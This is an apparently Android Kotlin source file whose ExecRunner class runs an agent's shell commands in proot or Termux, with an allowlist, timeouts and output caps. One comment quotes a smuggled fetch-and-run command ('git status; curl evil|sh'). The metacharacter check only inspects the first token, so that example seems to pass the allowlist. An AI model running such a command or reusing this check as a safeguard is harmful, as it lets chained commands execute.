package com.arkacode.app.core

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.File
import java.io.InputStream
import java.io.InputStreamReader
import java.util.concurrent.TimeUnit

/**
 * Eksekusi command `run_command` di dalam distro Linux asli.
 *
 * Dua backend, dipilih lewat [RuntimeMode]:
 *  - [RuntimeMode.PROOT] — distro Alpine/dsb di dalam proot (tanpa root).
 *  - [RuntimeMode.TERMUX] — langsung di environment Termux yang terpasang.
 *
 * Backend shell Android (`/system/bin/sh`, toybox) sudah dihapus: tidak ada
 * package manager dan tidak cukup untuk pekerjaan coding. Sekarang kalau
 * runtime belum siap, [run] melempar error yang menjelaskan langkah
 * perbaikannya — bukan diam-diam menjalankan command di shell Android.
 *
 * Garantean keamanan tetap: allowlist opsional, timeout, cap output 200 KB, dan
 * approval gate dari UI (5 tool sensitif).
 */
data class ExecResult(
    val stdout: String = "",
    val stderr: String = "",
    val exitCode: Int = 0,
    val timedOut: Boolean = false,
    val backend: String = "proot/Alpine",
)

class ExecRunner(
    private val context: Context,
    private val distro: DistroManager = DistroManager(context),
    private val runtimeMode: RuntimeMode = RuntimeMode.PROOT,
    private val termux: TermuxBridge = TermuxBridge(context),
) {
    companion object {
        /** Timeout default satu command di distro (apk add bisa lama). */
        const val PROOT_DEFAULT_TIMEOUT_MS = 60_000L
        const val MAX_OUT = 200_000
    }

    private var allowlist: List<String> = emptyList()

    fun setAllowlist(prefixes: List<String>) {
        allowlist = prefixes.map { it.trim() }.filter { it.isNotEmpty() }
    }

    private fun isAllowed(command: String): Boolean {
        if (allowlist.isEmpty()) return true
        val trimmed = command.trim()
        // Tolak metachar shell pada token pertama (mencegah "git status; curl evil|sh").
        val firstToken = trimmed.split(Regex("\\s+")).firstOrNull() ?: return false
        if (firstToken.any { it == ';' || it == '|' || it == '&' || it == '$' || it == '`' || it == '(' || it == ')' || it == '<' || it == '>' || it == '\\' }) return false
        // Prefix match hanya pada batas token ("git" tidak meloloskan "github-cli").
        return allowlist.any { entry ->
            trimmed.startsWith(entry) && (trimmed.length == entry.length || trimmed[entry.length].isWhitespace())
        }
    }

    /** Alasan runtime belum siap (cek ringan, tanpa menghitung ukuran rootfs); null = siap. */
    fun notReadyReason(): String? = when (runtimeMode) {
        RuntimeMode.TERMUX -> {
            val st = termux.status()
            if (st.ready) null else st.message
        }
        RuntimeMode.PROOT -> when {
            distro.prootBinary() == null || distro.loaderBinary() == null ->
                "binary proot tidak ada di APK ini (build ulang dengan jaringan agar task downloadProotBinaries berhasil)"
            !distro.isInstalled() ->
                "distro ${distro.spec.label} belum dipasang (Settings → Distro → Unduh & pasang)"
            else -> null
        }
    }

    suspend fun run(
        command: String,
        sessionId: String? = null,
        settings: ExecSettings = ExecSettings(),
        onProcess: ((Process) -> Unit)? = null,
    ): ExecResult {
        if (command.isBlank()) throw IllegalStateException("command required")
        if (!isAllowed(command)) throw IllegalStateException("command not in allowlist")

        notReadyReason()?.let { reason ->
            throw IllegalStateException("Runtime belum siap: $reason.")
        }

        return when (runtimeMode) {
            RuntimeMode.TERMUX -> runTermux(command, settings)
            RuntimeMode.PROOT -> {
                val fs = VirtualFs(context)
                val prootWorkspace = runCatching { fs.prootWorkspaceDir() }.getOrNull()
                val sessionWorkspace = sessionId?.let { runCatching { fs.workspaceDir(it) }.getOrNull() }
                runProot(command, prootWorkspace, sessionWorkspace, settings, onProcess)
            }
        }
    }

    // ------------------------------------------------------------------ termux

    /**
     * Jalankan command di Termux.
     *
     * Termux menulis stdout+stderr ke berkas (harus di lokasi yang bisa ditulis
     * Termux juga) lalu app membacanya lewat URI MediaStore milik sendiri.
     */
    private suspend fun runTermux(command: String, settings: ExecSettings): ExecResult {
        val sink = termux.createOutputSink("arkacode-cmd")
            ?: throw IllegalStateException("Tidak bisa menyiapkan berkas output di folder Download.")
        val timeout = settings.timeoutMs.takeIf { it > 0 } ?: PROOT_DEFAULT_TIMEOUT_MS
        val result = termux.run(
            command = command,
            outputFile = sink.file,
            outputUri = sink.uri,
            timeoutMs = timeout,
        )
        // Bereskan berkas di Downloads supaya tidak menumpuk.
        runCatching { context.contentResolver.delete(sink.uri, null, null) }
        runCatching { sink.file.delete() }
        return result.copy(stdout = result.stdout.take(MAX_OUT))
    }

    // ------------------------------------------------------------------- proot

    private suspend fun runProot(
        command: String,
        prootWorkspace: File?,
        sessionWorkspace: File?,
        settings: ExecSettings,
        onProcess: ((Process) -> Unit)?,
    ): ExecResult {
        val argv = distro.buildProotCommand(command, prootWorkspace, sessionWorkspace, settings)
            ?: throw IllegalStateException("Distro ${distro.spec.label} belum siap (rootfs atau binary proot tidak lengkap).")

        val builder = ProcessBuilder(argv)
        builder.directory(context.filesDir)
        builder.environment().apply {
            putAll(distro.prootProcessEnv())
            this["PATH"] = "/system/bin:/system/xbin:/vendor/bin"
            this["HOME"] = context.filesDir.absolutePath
            this["TMPDIR"] = context.cacheDir.absolutePath
        }
        val timeout = settings.timeoutMs.takeIf { it > 0 } ?: PROOT_DEFAULT_TIMEOUT_MS
        return execute(builder, timeout, onProcess)
    }

    // ------------------------------------------------------------------ shared

    private suspend fun execute(builder: ProcessBuilder, timeoutMs: Long, onProcess: ((Process) -> Unit)?): ExecResult {
        val process = withContext(Dispatchers.IO) {
            try {
                builder.redirectErrorStream(false).start()
            } catch (e: Exception) {
                throw IllegalStateException(e.message ?: "failed to start process")
            }
        }
        onProcess?.invoke(process)

        val stdout = StringBuilder()
        val stderr = StringBuilder()
        val t1 = threadRead(process.inputStream, stdout)
        val t2 = threadRead(process.errorStream, stderr)

        val finished = withContext(Dispatchers.IO) { process.waitFor(timeoutMs, TimeUnit.MILLISECONDS) }
        var timedOut = false
        if (!finished) {
            timedOut = true
            process.destroy()
            withContext(Dispatchers.IO) { process.waitFor(2, TimeUnit.SECONDS) }
            process.destroyForcibly()
        }
        try {
            withContext(Dispatchers.IO) {
                t1.join(3000)
                t2.join(3000)
            }
        } finally {
            // Pastikan tidak ada proses nyangkut (mis. coroutine di-cancel saat waitFor).
            runCatching { process.destroy() }
            runCatching { process.destroyForcibly() }
        }

        val exitCode = if (timedOut) 1 else process.exitValue()
        return ExecResult(
            stdout = stdout.toString().take(MAX_OUT),
            stderr = stderr.toString().take(MAX_OUT),
            exitCode = exitCode,
            timedOut = timedOut,
            backend = "proot/${distro.spec.label}",
        )
    }

    private fun threadRead(input: InputStream, sink: StringBuilder): Thread {
        val t = Thread {
            try {
                val reader = BufferedReader(InputStreamReader(input))
                val buf = CharArray(8192)
                var keepReading = true
                while (keepReading) {
                    val n = reader.read(buf)
                    if (n < 0) break
                    if (sink.length < MAX_OUT) {
                        sink.append(buf, 0, minOf(n, MAX_OUT - sink.length))
                    }
                    if (sink.length >= MAX_OUT) keepReading = false
                }
            } catch (ignored: Exception) {
                // stream ditutup saat destroy — berhenti diam-diam
            }
        }
        t.name = "arka-exec-read"
        t.isDaemon = true
        t.start()
        return t
    }
}
